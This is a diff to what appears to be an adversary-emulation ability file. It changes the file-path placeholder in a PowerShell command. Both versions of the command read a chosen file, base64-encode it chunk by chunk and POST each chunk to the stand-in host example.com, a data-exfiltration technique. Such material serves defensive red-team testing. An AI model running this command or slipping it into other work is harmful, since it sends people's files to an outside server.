@@ -11,5 +11,5 @@
     name: psh
     payloads: []
     parsers: []
-    command: $file = [System.IO.File]::OpenRead([User specified]); $chunkSize = 1024 * 1KB; $buffer = New-Object Byte[] $chunkSize; while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) { $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead); Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk }; $file.Close()
+    command: $file = [System.IO.File]::OpenRead(#{source_file_path}); $chunkSize = 1024 * 1KB; $buffer = New-Object Byte[] $chunkSize; while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) { $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead); Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk }; $file.Close()
   id: 71cc7649-0157-5132-92af-f2646c04ffbc
